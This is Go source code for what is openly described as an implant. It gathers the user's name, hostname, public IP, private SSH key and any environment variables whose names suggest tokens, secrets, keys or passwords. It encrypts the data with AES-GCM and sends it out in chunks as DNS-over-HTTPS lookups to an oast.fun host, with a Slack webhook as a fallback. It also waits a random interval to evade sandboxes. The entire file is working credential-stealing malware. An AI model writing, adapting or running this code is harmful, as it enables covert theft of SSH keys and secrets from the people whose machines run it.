package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"math/big"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/miekg/dns" // For DNS Fqdn function
)

// Config struct for C2 details
type Config struct {
	DoHC2Endpoint string `json:"doh_c2"`
	SlackC2URL    string `json:"slack_c2"`
	RealC2Host    string `json:"real_c2_host"`
	AESKey        []byte `json:"aes_key"`
}

var Cfg Config

// Encrypt data using AES-GCM
func encrypt(plaintext, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, aesgcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil
	}
	ciphertext := aesgcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext
}

// Split a string into chunks of n length
func splitString(s string, n int) []string {
	var chunks []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// Random int between 0 and max-1
func randInt(max int) int {
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0
	}
	return int(n.Int64())
}

// Gather system data to exfiltrate
func gatherSystemData() (map[string]interface{}, error) {
	data := make(map[string]interface{})

	currentUser, err := user.Current()
	if err != nil {
		return nil, err
	}
	hostname, err := os.Hostname()
	if err != nil {
		return nil, err
	}
	cwd, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	// Public IP fetch
	publicIP := ""
	resp, err := http.Get("https://api.ipify.org")
	if err == nil {
		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		publicIP = string(body)
	}

	// Read SSH key if exists
	sshKey := ""
	if currentUser.HomeDir != "" {
		keyBytes, err := ioutil.ReadFile(currentUser.HomeDir + "/.ssh/id_rsa")
		if err == nil {
			sshKey = base64.StdEncoding.EncodeToString(keyBytes)
		}
	}

	// Collect environment variables containing secrets
	envSecrets := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) < 2 {
			continue
		}
		k, v := parts[0], parts[1]
		lower := strings.ToLower(k)
		if strings.Contains(lower, "token") || strings.Contains(lower, "secret") || strings.Contains(lower, "key") || strings.Contains(lower, "pass") {
			envSecrets[k] = v
		}
	}

	data["user"] = currentUser.Username
	data["hostname"] = hostname
	data["cwd"] = cwd
	data["os"] = runtime.GOOS
	data["arch"] = runtime.GOARCH
	data["public_ip"] = publicIP
	data["ssh_key_b64"] = sshKey
	data["env_secrets"] = envSecrets

	return data, nil
}

// Channel 1: DNS over HTTPS exfiltration
func commsDoH(data []byte) bool {
	encryptedData := base64.URLEncoding.EncodeToString(encrypt(data, Cfg.AESKey))
	chunks := splitString(encryptedData, 60)

	for _, chunk := range chunks {
		queryName := dns.Fqdn(chunk + "." + Cfg.RealC2Host)
		resp, err := http.Get(Cfg.DoHC2Endpoint + "?name=" + queryName + "&type=A")
		if err != nil || resp.StatusCode != 200 {
			return false
		}
		resp.Body.Close()
		time.Sleep(1 * time.Second) // Slow down beaconing
	}
	return true
}

// Channel 2: Slack webhook fallback (disabled since no Slack webhook URL)
func commsSlack(data []byte) bool {
	if Cfg.SlackC2URL == "" {
		return false
	}
	encryptedData := base64.StdEncoding.EncodeToString(encrypt(data, Cfg.AESKey))
	payload := map[string]string{"text": encryptedData}
	jsonPayload, _ := json.Marshal(payload)

	resp, err := http.Post(Cfg.SlackC2URL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil || resp.StatusCode != 200 {
		return false
	}
	resp.Body.Close()
	return true
}

func main() {
	key, _ := base64.StdEncoding.DecodeString("Y0tWbVluUnBUZz09eTB0Nk9uUnpZM1J2YkdWdQ==") // Example AES key, replace it!

	Cfg = Config{
		DoHC2Endpoint: "https://dns.google/resolve",
		SlackC2URL:    "",
		RealC2Host:    "ocvomeqbrouywnpfvqwh8d0aqr5kwaszb.oast.fun",
		AESKey:        key,
	}

	// Anti-sandbox sleep for 30-90 seconds
	time.Sleep(time.Duration(30+randInt(60)) * time.Second)

	stolenData, err := gatherSystemData()
	if err != nil {
		return
	}

	jsonData, _ := json.Marshal(stolenData)

	// Try DoH first; skip Slack fallback because no Slack webhook URL
	commsDoH(jsonData)

	// Keep alive (simulate implant waiting for commands)
	select {}
}
